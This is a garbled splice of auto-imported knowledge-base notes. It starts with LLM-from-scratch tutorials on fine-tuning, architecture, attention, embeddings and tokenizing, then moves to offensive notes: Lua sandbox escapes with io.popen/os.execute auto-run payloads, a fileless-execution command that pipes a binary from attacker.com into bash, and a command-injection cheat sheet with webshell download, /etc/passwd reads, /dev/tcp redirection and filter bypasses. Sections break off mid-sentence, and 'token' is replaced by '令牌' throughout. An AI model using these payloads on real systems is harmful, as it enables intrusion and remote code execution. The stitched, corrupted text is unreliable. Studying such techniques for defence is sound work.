Fine-Tuning for Classification What is Preparing the data set Data set size Entries length Initialize the model Classification head Parameters to tune Entries to use for training Complete GPT2 fine-tune classification code # 核心要点 The goal of this section is to show how to fine-tune an already pre-trained model so instead of generating new text the LLM will select give the probabilities of the given text being categorized in each of the given categories (like if a text is spam or not). Using the open-source pre-trained weights initialize the model to train. We have already done this before and follow the instructions of https://github.com/rasbt/LLMs-from-scratch/blob/main/ch06/01 main-chapter-code/ch06.ipynb you can easily do it. In previos sections the LLM was trained reducing the loss of every predicted 令牌，even though almost all the predicted tokens were in the input sentence (only 1 at the end was really predicted) in order for the model to understand better the language. In this case we only care on the model being able to predict if the model is spam or not, so we only care about the last 令牌 predicted. Therefore, it's needed to modify out previous training loss functions to only take into account that 令牌. Note how for each batch we are only interested in the logits of the last 令牌 predicted. # 命令 / 载荷 / 操作片段 # 1. Then we will compare the generated tokens with the expected ones in order to train the model into learning the tokens it needs to generate. As in the previous examples we already predicted some tokens, it's possible to reuse that function for this purpose. In order to perform a correct training it's needed to measure check the predictions obtained for the expected 令牌. The goal of the training is to maximize the likelihood of the correct 令牌，which involves increasing its probability relative to other tokens. However, instead of working with the raw predictions, it will work with a logarithm with base n. So if the current prediction of the expected 令牌 was 7.4541e-05, the natural logarithm (base e) of 7.4541e-05 is approximately -9.5042.\ Another way to measure how good the model is is called perplexity. Perplexity is a metric used to evaluate how well a probability model predicts a sample. In language modelling, it represents the model's uncertainty when predicting the next 令牌 in a sequence.\ For example, a perplexity value of 48725, means that when needed to predict a 令牌 it's unsure about which among 48,725 tokens in the vocabulary is the good one. The top-k means that we will start reducing to -inf all the probabilities of all the tokens expect of the top k tokens. So, if k=3, before making a decision only the 3 most probably tokens will have a probability different from -inf. After applying the temperature, a softmax function is applied again to make all the reminding tokens have a total probability of 1. The train data loader (with the data already separated and prepared for training) # 命令 / 载荷 / 操作片段 # 1. Functions to transform text <--> ids 123456789# Functions to transform from tokens to ids and from to ids to tokensdef text_to_token_ids(text, tokenizer): encoded = tokenizer.encode(text, allowed_special={'<|endoftext|>'}) encoded_tensor = torch.tensor(encoded).unsqueeze(0) # add batch dimension return encoded_tensordef token_ids_to_text(token_ids, tokenizer): flat = token_ids.squeeze(0) # remove batch dimension return tokenizer.decode(flat.tolist()) # 2. Select device for training & pre calculations 12345678910111213141516171819202122# Indicate the device to useif torch.cuda.is_available(): device = torch.device("cuda")elif torch.backends.mps.is_available(): device = torch.device("mps")else: device = torch.device("cpu")print(f"Using {device} device.")model.to(device) # no assignment model = model.to(device) necessary for nn.Module classes# Pre-calculate losses without starting yettorch.manual_seed(123) # For reproducibility due to the shuffling in the data loaderwith torch.no_grad(): # Disable gradient tracking for efficiency because we are not training, yet train_loss = calc_loss_loader(train_loader, model, device) val_loss = calc_loss_loader(val_loader, model, device)print("Training loss:", train_loss)print("Validation loss:", val_loss) # 3. Start training 123456789101112131415161718import timestart_time = time.time()torch.manual_seed(123)model = GPTModel(GPT_CONFIG_124M)model.to(device)optimizer = torch.optim.AdamW(model.parameters(), lr=0.0004, weight_decay=0.1)num_epochs = 10train_losses, val_losses, tokens_seen = train_model_simple( model, train_loader, val_loader, optimizer, device, num_epochs=num_epochs, eval_freq=5, eval_iter=5, start_context="Every effort moves you", tokenizer=tokenizer)end_time = time.time()execution_time_minutes = (end_time - start_time) / 60print(f"Training completed in {execution_time_minutes:.2f} minutes.") # 4. Save the model 1234567891011121314151617# Save the model and the optimizer for later trainingtorch.save({ "model_state_dict": model.state_dict(), "optimizer_state_dict": optimizer.state_dict(), },"/tmp/model_and_optimizer.pth")# Note that this model with the optimizer oc

LLM Architecture 技术笔记 [!summary] 提炼定位 面向 工具与资源 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 5. LLM Architecture 技术笔记 做知识查询与实验复现。 # 中文提炼 核心目标是明确 5. LLM Architecture 技术笔记 的输入、输出、适用边界和替代方案。 优先关注：LLM Architecture、Code representation、GELU Activation Function、Purpose and Functionality、FeedForward Neural Network；工具只作为方法的一部分，不把安装步骤当知识主体。 记录典型命令、输出字段、失败条件和与其它工具的衔接方式。 后续扩展时补版本差异、平台差异和实验样例。 本页已沉淀 20 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 LLM Architecture Code representation GELU Activation Function Purpose and Functionality FeedForward Neural Network Multi-Head Attention Mechanism Layer Normalization Transformer Block Step-by-Step Functionality GPTModel Number of Parameters to train Step-by-Step Calculation 1. Embedding Layers: 令牌 Embedding & Position Embedding 2. Transformer Blocks 3. Final Layers 4. Summing Up All Parameters Generate Text # 核心要点 Input (Tokenized Text): The process begins with tokenized text, which is converted into numerical representations. 令牌 Embedding and Positional Embedding Layer: The tokenized text is passed through a 令牌 embedding layer and a positional embedding layer, which captures the position of tokens in a sequence, critical for understanding word order. Feed Forward Layer: Responsible for processing the information from the attention layer and making predictions about the next 令牌. This was already explained in an earlier section. Multi-Head Self-Attention: Allows the model to focus on different positions within the input sequence when encoding a 令牌. Masking: A causal mask is applied to prevent the model from attending to future tokens (important for autoregressive models like GPT). 令牌 Embeddings (tok emb): Converts 令牌 indices into embeddings. As reminder, these are the weights given to each dimension of each 令牌 in the vocabulary. Positional Embeddings (pos emb): Adds positional information to the embeddings to capture the order of tokens. As reminder, these are the weights given to 令牌 according to it's position in the text. # 命令 / 载荷 / 操作片段 # 1. GELU Activation Function 12345678910# From https://github.com/rasbt/LLMs-from-scratch/tree/main/ch04class GELU(nn.Module): def __init__(self): super().__init__() def forward(self, x): return 0.5 * x * (1 + torch.tanh( torch.sqrt(torch.tensor(2.0 / torch.pi)) * (x + 0.044715 * torch.pow(x, 3)) )) # 2. FeedForward Neural Network 1234567891011121314151617# From https://github.com/rasbt/LLMs-from-scratch/tree/main/ch04class FeedForward(nn.Module): def __init__(self, cfg): super().__init__() self.layers = nn.Sequential( nn.Linear(cfg["emb_dim"], 4 * cfg["emb_dim"]), GELU(), nn.Linear(4 * cfg["emb_dim"], cfg["emb_dim"]), ) def forward(self, x): # x shape: (batch_size, seq_len, emb_dim) x = self.layers0# x shape: (batch_size, seq_len, 4 * emb_dim) x = self.layers1 # x shape remains: (batch_size, seq_len, 4 * emb_dim) x = self.layers2 # x shape: (batch_size, seq_len, emb_dim) return x # Output shape: (batch_size, seq_len, emb_dim) # 3. Layer Normalization 12345678910111213# From https://github.com/rasbt/LLMs-from-scratch/tree/main/ch04class LayerNorm(nn.Module): def __init__(self, emb_dim): super().__init__() self.eps = 1e-5 # Prevent division by zero during normalization. self.scale = nn.Parameter(torch.ones(emb_dim)) self.shift = nn.Parameter(torch.zeros(emb_dim)) def forward(self, x): mean = x.mean(dim=-1, keepdim=True) var = x.var(dim=-1, keepdim=True, unbiased=False) norm_x = (x - mean) / torch.sqrt(var + self.eps) return self.scale * norm_x + self.shift # 4. Number of Parameters to train 1234567891011121314GPT_CONFIG_124M = { "vocab_size": 50257, # Vocabulary size "context_length": 1024, # Context length "emb_dim": 768, # Embedding dimension "n_heads": 12, # Number of attention heads "n_layers": 12, # Number of layers "drop_rate": 0.1, # Dropout rate "qkv_bias": False # Query-Key-Value bias}model = GPTModel(GPT_CONFIG_124M)total_params = sum(p.numel() for p in model.parameters())print(f"Total number of parameters: {total_params:,}")# Total number of parameters: 163,009,536 # 5. 1. Embedding Layers: 令牌 Embedding & Position Embedding 1token_embedding_params = 50257 * 768 = 38,597,376 # 6. 1. Embedding Layers: 令牌 Embedding & Position Embedding 1position_embedding_params = 1024 * 768 = 786,432 # 7. 1. Embedding Layers: 令牌 Embedding & Position Embedding 12embedding_params = token_embedding_params + position_embedding_paramsembedding_params = 38,597,376 + 786,432 = 39,383,808 # 8. 2. Transformer Blocks 1qkv_params = emb_dim * emb_dim = 768 * 768 = 589,824 # 9. 2. Transformer Blocks 1total_qkv_params = 3 * qkv_params = 3 * 589,824 = 1,769,472 # 10. 2. Transformer Blocks 1out_proj_params = (emb_dim * emb_dim) + emb_dim = (768 * 768) + 768 = 589,824 + 768 = 590,592 # 11. 2. Transformer Blocks 12mha_param

Attention Mechanisms 技术笔记 的输入、输出、适用边界和替代方案。 优先关注：Attention Mechanisms、Attention Mechanisms and Self-Attention in Neural Networks、Understanding Attention Mechanisms、Example: Machine Translation、Introduction to Self-Attention；工具只作为方法的一部分，不把安装步骤当知识主体。 记录典型命令、输出字段、失败条件和与其它工具的衔接方式。 后续扩展时补版本差异、平台差异和实验样例。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Attention Mechanisms Attention Mechanisms and Self-Attention in Neural Networks Understanding Attention Mechanisms Example: Machine Translation Introduction to Self-Attention Key Concepts Calculating Attention Weights: A Step-by-Step Example Step 1: Compute Attention Scores Step 2: Normalize Attention Scores to Obtain Attention Weights Step 3: Compute the Context Vector Summary of the Process Self-Attention with Trainable Weights Step 1: Compute Queries, Keys, and Values Step 2: Compute Scaled Dot-Product Attention Step 3: Compute Context Vectors Code Example Causal Attention: Hiding Future Words Applying a Causal Attention Mask # 核心要点 Tokens: Individual elements of the input sequence (e.g., words in a sentence). Embeddings: Vector representations of tokens, capturing semantic information. Attention Weights: Values that determine the importance of each 令牌 relative to others. Just multiply each dimension value of the query with the relevant one of each 令牌 and add the results. You get 1 value per pair of tokens. Moreover, softmax function is used because it accentuates differences due to the exponential part, making easier to detect useful values. Just get each attention weight and multiply it to the related 令牌 dimensions and then sum all the dimensions to get just 1 vector (the context vector) # 命令 / 载荷 / 操作片段 # 1. Step 1: Compute Queries, Keys, and Values 12345678import torch.nn as nnd_in = 3d_out = 2W_query = nn.Parameter(torch.rand(d_in, d_out))W_key = nn.Parameter(torch.rand(d_in, d_out))W_value = nn.Parameter(torch.rand(d_in, d_out)) # 2. Step 1: Compute Queries, Keys, and Values 123queries = torch.matmul(inputs, W_query)keys = torch.matmul(inputs, W_key)values = torch.matmul(inputs, W_value) # 3. Applying a Causal Attention Mask 12mask = torch.triu(torch.ones(seq_len, seq_len), diagonal=1) * float('-inf') masked_scores = attention_scores + mask # 4. Applying a Causal Attention Mask 1attention_weights = torch.softmax(masked_scores, dim=-1) # 5. Masking Additional Attention Weights with Dropout 12dropout = nn.Dropout(p=0.5)attention_weights = dropout(attention_weights) # 工具与参考入口 torch.nn.MultiheadAttention https://www.manning.com/books/build-a-large-language-model-from-scratch # 检查清单 是否记录前置条件 是否保留可复现步骤 是否补充检测 / 防御视角 # 关联 工具与资源总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 04-工具/3. 令牌 Embeddings.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 3. 令牌 Embeddings [!summary] 提炼定位 面向 工具与资源 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 3. 令牌 Embeddings 做知识查询与实验复现。 # 中文提炼 核心目标是明确 3. 令牌 Embeddings 的输入、输出、适用边界和替代方案。 优先关注：令牌 Embeddings、What Are 令牌 Embeddings?、Initializing 令牌 Embeddings、How 令牌 Embeddings Work During Training、Positional Embeddings: Adding Context to 令牌 Embeddings；工具只作为方法的一部分，不把安装步骤当知识主体。 记录典型命令、输出字段、失败条件和与其它工具的衔接方式。 后续扩展时补版本差异、平台差异和实验样例。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 令牌 Embeddings What Are 令牌 Embeddings? Initializing 令牌 Embeddings How 令牌 Embeddings Work During Training Positional Embeddings: Adding Context to 令牌 Embeddings Why Positional Embeddings Are Needed: Types of Positional Embeddings: How Positional Embeddings Are Integrated: Positional Embeddings in Modern LLMs Rotary Positional Embeddings (RoPE) Extending Context Windows in RoPE-Based Models Code Example # 核心要点 The goal of this third phase is very simple: Assign each of the previous tokens in the vocabulary a vector of the desired dimensions to train the model. Each word in the vocabulary will a point in a space of X dimensions.\ Moreover, during the 令牌 embedding another layer of embeddings is created which represents (in this case) the absolute possition of the word in the training sentence. This way a word in different positions in the sentence will have a different representation (meaning). Vocabulary Size: The total number of unique tokens (e.g., words, subwords) in the model’s vocabulary. Embedding Dimensions: The number of numerical values (dimensions) in each 令牌’s vector. Higher dimensions can capture more nuanced information but require more computational resources. Vocabulary Size: 6 tokens [1, 2, 3, 4, 5, 6] At the start of training, 令牌 embeddings are typically initialized with small random values. These initial values are adjusted (fine-tuned) during training to better represent the tokens' meanings based on the training data. Each row corresponds to a 令牌 in the vocabulary. For example, the 令牌 at index 3 has an embedding vector [-0.4015, 0.9666, -1.1481]. Accessing a 令牌’s Embedding: The 令牌 at index 3 is represented by the vector [-0.4015, 0.9666, -1.1481]. These values are trainable parameters that the model will adjust during training to better represent the 令牌's context and meaning. Max Sequence Length: 4 (number of tokens per sample) Each 令牌 in the sequence is represented by a 256-dimensional vector. 令牌 Order Matters: In sentences, the meaning often depends on the order of words. For example, "The cat sat on the mat" vs. "The mat sat on the cat." # 命令 / 载荷 / 操作片段 # 1. Initializing 令牌 Embeddings 12345678910import torch# Set a random seed for reproducibilitytorch.manual_seed(123)# Create an embedding layer with 6 tokens and 3 dimensionsembedding_layer = torch.nn.Embedding(6, 3)# Display the initial weights (embeddings)print(embedding_layer.weight) # 2. Initializing 令牌 Embeddings 1234567luaCopy codeParameter containing:tensor([[ 0.3374, -0.1778, -0.1690], [ 0.9178, 1.5810, 1.3010], [ 1.2753, -0.2010, -0.1606], [-0.4015, 0.9666, -1.1481], [-1.1589, 0.3255, -0.6315], [-2.8400, -0.7849, -1.4096]], requires_grad=True) # 3. Initializing 令牌 Embeddings 123# Retrieve the embedding for the token at index 3token_index = torch.tensor([3])print(embedding_layer(token_index)) # 4. Initializing 令牌 Embeddings 1tensor(-0.4015, 0.9666, -1, grad_fn=<EmbeddingBackward0>) # 5. How Positional Embeddings Are Integrated: 123Combined Embedding = Token Embedding + Positional Embedding = [0.5 + 0.1, -0.2 + 0.3, 0.1 + (-0.1)] = [0.6, 0.1, 0.0] # 6. Extending Context Windows in RoPE-Based Models 1234# Position Interpolation (PI) intuitionorig_ctx = 2048new_ctx = 8192scaled_pos = pos * (orig_ctx / new_ctx) # 工具与参考入口 https://www.manning.com/books/build-a-large-language-model-from-scratch https://arxiv.org/abs/2306.15595 https://arxiv.org/abs/2309.00071 # 检查清单 是否记录前置条件 是否保留可复现步骤 是否补充检测 / 防御视角 # 关联 工具与资源总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Data Sampling 技术笔记 做知识查询与实验复现。 # 中文提炼 核心目标是明确 2. Data Sampling 技术笔记 的输入、输出、适用边界和替代方案。 优先关注：Data Sampling、Data Sampling、Why Data Sampling Matters、Key Concepts in Data Sampling、Step-by-Step Example；工具只作为方法的一部分，不把安装步骤当知识主体。 记录典型命令、输出字段、失败条件和与其它工具的衔接方式。 后续扩展时补版本差异、平台差异和实验样例。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Data Sampling Data Sampling Why Data Sampling Matters Key Concepts in Data Sampling Step-by-Step Example Code Example Advanced Sampling Strategies (2023-2025) Temperature-Based Mixture Weighting # 核心要点 Tokenization: Breaking down text into smaller units called tokens (e.g., words, subwords, or characters). Sequence Length (max length): The number of tokens in each input sequence. Sliding Window: A method to create overlapping input sequences by moving a window over the tokenized text. Stride: The number of tokens the sliding window moves forward to create the next sequence. Assume we use a basic tokenizer that splits the text into words and punctuation marks: Max Sequence Length (max length): 4 tokens Sliding Window Stride: 1 令牌 Input Sequences: Each input sequence consists of max length tokens. Target Sequences: Each target sequence consists of the tokens that immediately follow the corresponding input sequence. Stride of 1: The window moves forward by one 令牌 each time, resulting in highly overlapping sequences. This can lead to better learning of contextual relationships but may increase the risk of overfitting since similar data points are repeated. Stride of 2: The window moves forward by two tokens each time, reducing overlap. This decreases redundancy and computational load but might miss some contextual nuances. # 命令 / 载荷 / 操作片段 # 1. Step-by-Step Example 1"Lorem ipsum dolor sit amet, consectetur adipiscing elit." # 2. Step-by-Step Example 1Tokens: ["Lorem", "ipsum", "dolor", "sit", "amet,", "consectetur", "adipiscing", "elit."] # 3. Step-by-Step Example 123456[ ["Lorem", "ipsum", "dolor", "sit"], ["ipsum", "dolor", "sit", "amet,"], ["dolor", "sit", "amet,", "consectetur"], ["sit", "amet,", "consectetur", "adipiscing"], ] # 4. Step-by-Step Example 123456[ ["ipsum", "dolor", "sit", "amet,"], ["dolor", "sit", "amet,", "consectetur"], ["sit", "amet,", "consectetur", "adipiscing"], ["amet,", "consectetur", "adipiscing", "elit."], ] # 5. Temperature-Based Mixture Weighting 1p(i) = \frac{w_i^{\alpha}}{\sum_j w_j^{\alpha}} # 6. Temperature-Based Mixture Weighting 12345678from collections import Counterdef temperature_sample(corpus_ids, alpha=0.7): counts = Counter(corpus_ids) # number of tokens seen per corpus probs = {c: c_count**alpha for c, c_count in counts.items()} Z = sum(probs.values()) probs = {c: p/Z for c, p in probs.items()} # Now draw according to probs to fill every batch # 工具与参考入口 Build a Large Language Model from Scratch (Manning, 2024) Llama 2: Open Foundation and Fine-Tuned Chat Models (2023) # 检查清单 是否记录前置条件 是否保留可复现步骤 是否补充检测 / 防御视角 # 关联 工具与资源总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Tokenizing 技术笔记 做知识查询与实验复现。 # 中文提炼 核心目标是明确 1. Tokenizing 技术笔记 的输入、输出、适用边界和替代方案。 优先关注：Tokenizing、How Tokenizing Works、Advanced Tokenizing Methods、Code Example；工具只作为方法的一部分，不把安装步骤当知识主体。 记录典型命令、输出字段、失败条件和与其它工具的衔接方式。 后续扩展时补版本差异、平台差异和实验样例。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Tokenizing How Tokenizing Works Advanced Tokenizing Methods Code Example # 核心要点 The goal of this initial phase is very simple: Divide the input in tokens (ids) in some way that makes sense. Basic Tokenizer: A simple tokenizer might split text into individual words and punctuation marks, removing spaces. Tokens: ["Hello", ",", "world", "!"] To convert tokens into numerical IDs, a vocabulary is created. This vocabulary lists all unique tokens (words and symbols) and assigns each a specific ID. Special Tokens: These are special symbols added to the vocabulary to handle various scenarios: [UNK] (Unknown): Represents tokens that are not in the vocabulary. Starts with individual characters as tokens. Iteratively merges the most frequent pairs of tokens into a single 令牌. Eliminates the need for an [UNK] 令牌 since all words can be represented by combining existing subword tokens. Purpose: Uses a probabilistic model to determine the most likely set of subword tokens. Starts with a large set of potential tokens. Iteratively removes tokens that least improve the model's probability of the training data. Often results in more efficient and compact tokenizations. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/防御检测与OPSEC/绕过 Lua sandboxes (embedded VMs, game clients).md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 绕过 Lua sandboxes (embedded VMs, game clients) [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 绕过 Lua sandboxes (embedded VMs, game clients) 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 绕过 Lua sandboxes (embedded VMs, game clients) 建立行为证据、检测逻辑和操作暴露面。 优先关注：Enumerate the sandboxed environment、Direct command execution if io/os is exposed、Zero-click triggers via auto-run callbacks、Dangerous primitives to hunt during 侦察、Optional escalation: abusing Lua bytecode loaders；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Enumerate the sandboxed environment Direct command execution if io/os is exposed Zero-click triggers via auto-run callbacks Dangerous primitives to hunt during 侦察 Optional escalation: abusing Lua bytecode loaders 检测 and hardening notes (for defenders) # 核心要点 Treat the VM as an unknown environment: enumerate G and discover what dangerous primitives are reachable. If io/os is exposed, you often have direct command execution (io.popen, os.execute). If load/loadstring/loadfile are exposed, executing crafted Lua bytecode can subvert memory safety in some versions (≤5.1 verifiers are bypassable; 5.2 removed verifier), enabling advanced 利用. Generalize this pattern for your target: any textbox, toast, logger, or UI callback that accepts strings can act as stdout for 侦察. Also check: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM). If the host application pushes scripts to clients and the VM exposes auto-run hooks (e.g., OnInit/OnLoad/OnEnter), place your 载荷 there for drive-by compromise as soon as the script loads: io, os: io.popen, os.execute, file I/O, env access. load, loadstring, loadfile, dofile: execute source or bytecode; supports loading untrusted bytecode. Lua ≤ 5.1 shipped a bytecode verifier that has known bypasses. Lua 5.2 removed the verifier entirely (official stance: applications should just reject precompiled chunks), widening the attack surface if bytecode loading is not prohibited. Workflows typically: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), then pivot to arbitrary read/write or native code execution. Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi. # 命令 / 载荷 / 操作片段 # 1. Enumerate the sandboxed environment 1234567-- Minimal _G dumper for any Lua sandbox with some output primitive `out`local function dump_globals(out) out("=== DUMPING _G ===") for k, v in pairs(_G) do out(tostring(k) .. " = " .. tostring(v)) endend # 2. Enumerate the sandboxed environment 1234567891011121314-- Build an output channel using in-game primitiveslocal function ButlerOut(label) -- Some engines require enabling an audio channel before speaking H.PlaySound(0, "r[1]") -- quirk: required before H.Say() return function(msg) H.Say(label or 1, msg) endendfunction OnMenu(menuNum) if menuNum ~= 3 then return end local out = ButlerOut(1) dump_globals(out)end # 3. Direct command execution if io/os is exposed 123456-- Windows exampleio.popen("calc.exe")-- Cross-platform variants depending on exposureos.execute("/usr/bin/id")io.popen("/bin/sh -c 'id'") # 4. Zero-click triggers via auto-run callbacks 123function OnInit() io.popen("calc.exe") -- or any commandend # 5. Dangerous primitives to hunt during 侦察 123456789101112-- Execute source/bytecodelocal f = load("return 1+1")print(f()) -- 2-- loadstring is alias of load for strings in 5.1local bc = string.dump(function() return 0x1337 end)local g = loadstring(bc) -- in 5.1 may run precompiled bytecodeprint(g())-- Load native library symbol (if allowed)local mylib = package.loadlib("./libfoo.so", "luaopen_foo")local foo = mylib() # 工具与参考入口 This House is Haunted: a decade old RCE in the AION client (housing Lua VM) Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws lua-l (2009): Discussion on dropping the bytecode verifier Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes) # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/防御检测与OPSEC/绕过 FS protections- read-only - no-exec - Distroless.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 绕过 FS protections- read-only - no-exec - Distroless [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 绕过 FS protections- read-only - no-exec - Distroless 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 绕过 FS protections- read-only - no-exec - Distroless 建立行为证据、检测逻辑和操作暴露面。 优先关注：绕过 FS protections: read-only /no-exec/ Distroless、Videos、read-only /no-exec scenario、Easiest 绕过: Scripts、Memory Bypasses；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 绕过 FS protections: read-only /no-exec/ Distroless Videos read-only / no-exec scenario Easiest 绕过: Scripts Memory Bypasses FD + exec syscall 绕过 DDexec / EverythingExec MemExec Memdlopen Distroless 绕过 What is distroless 反弹 Shell # 核心要点 It's more and more common to find linux machines mounted with read-only (ro) file system protection, specially in containers. This is because to run a 容器 with ro file system is as easy as setting readOnlyRootFilesystem: true in the securitycontext: <strong> readOnlyRootFilesystem: true However, even if the file system is mounted as ro, /dev/shm will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be mounted with no-exec protection, so if you 下载 a binary here you won't be able to execute it. From a red team perspective, this makes complicated to 下载 and execute binaries that aren't in the system already (like backdoors o enumerators like kubectl). Note that I mentioned binaries, you can execute any script as long as the interpreter is inside the machine, like a shell script if sh is present or a python script if python is installed. However, this isn't just enough to execute your binary backdoor or other binary 工具 you might need to run. # 命令 / 载荷 / 操作片段 # 1. DDexec / EverythingExec 12# Basic examplewget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar # 工具与参考入口 DEF CON 31：Exploring Linux Memory Manipulation for Stealth and 规避 fileless-elf-exec DDexec / EverythingExec Memexec https://github.com/arget13/memexec/blob/main/a.php memdlopen https://github.com/carlospolop/DistrolessRCE # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/防御检测与OPSEC/命令注入.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 命令注入 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 命令注入 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 命令注入 建立行为证据、检测逻辑和操作暴露面。 优先关注：工具、方法论、Basic Commands、Chaining Commands、Argument Injection；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 36 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 工具 方法论 Basic Commands Chaining Commands Argument Injection Inside A Command Filter Bypasses 绕过 Without Space 绕过 With A Line Return 绕过 With Backslash Newline 绕过 With Tilde Expansion 绕过 With Brace Expansion 绕过 Characters Filter 绕过 Characters Filter Via Hex Encoding 绕过 With Single Quote 绕过 With Double Quote 绕过 With Backticks 绕过 With Backslash and Slash # 核心要点 命令注入 is a security 漏洞 that allows an attacker to execute arbitrary commands inside a vulnerable application. commixproject/commix：Automated All-in-One OS 命令注入 and 利用 tool The danger of 命令注入 is that it can allow an attacker to execute any command on the system, potentially leading to full system compromise. Example of 命令注入 with PHP: In the above code, the PHP script uses the system() function to execute the ping command with the IP address or domain provided by the user through the ip GET parameter. If an attacker provides input like 8.8.8.8; cat /etc/passwd, the actual command that gets executed would be: ping -c 4 8.8.8.8; cat /etc/passwd. ; (Semicolon): Allows you to execute multiple commands sequentially. && (AND): Execute the second command only if the first command succeeds (returns a zero exit status). || (OR): Execute the second command only if the first command fails (returns a non-zero exit status). & (Background): Execute the command in the background, allowing the user to continue using the shell. 命令注入 using backticks. 命令注入 using substitution In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments. Input redirection. The < character tells the shell to read the contents of the file specified. # 命令 / 载荷 / 操作片段 # 1. 方法论 1234<?php $ip = $_GET['ip']; system("ping -c 4 " . $ip);?> # 2. Basic Commands 123456cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/sh... # 3. Chaining Commands 12345command1; command2 # Execute command1 and then command2command1 && command2 # Execute command2 only if command1 succeedscommand1 || command2 # Execute command2 only if command1 failscommand1 & command2 # Execute command1 in the backgroundcommand1 | command2 # Pipe the output of command1 into command2 # 4. Argument Injection 1chrome '--gpu-launcher="id>/tmp/foo"' # 5. Argument Injection 1ssh '-oProxyCommand="touch /tmp/foo"' foo@foo # 6. Argument Injection 1psql -o'|id>/tmp/foo' # 7. Argument Injection 12$url = "https://example.tld/" . $_GET['path'] . ".txt";system("wget.exe -q " . escapeshellarg($url)); # 8. Argument Injection 12# -o, --output <file> Write to file instead of stdout curl http://[ATTACKER.DOMAIN.TLD]/ -o webshell.php # 9. Inside A Command 1original_cmd_by_server `cat /etc/passwd` # 10. Inside A Command 1original_cmd_by_server $(cat /etc/passwd) # 11. 绕过 Without Space 12cat${IFS}/etc/passwd ls${IFS}-la # 12. 绕过 Without Space 1{cat,/etc/passwd} # 13. 绕过 Without Space 12cat</etc/passwd sh</dev/tcp/127.0.0.1/4242 # 14. 绕过 Without Space 1X=$'uname\x20-a'&&$X # 15. 绕过 Without Space 1;ls%09-al%09/home # 16. 绕过 Without Space 12ping%CommonProgramFiles:~10,-18%127.0.0.1 ping%PROGRAMFILES:~10,-5%127.0.0.1 # 17. 绕过 With A Line Return 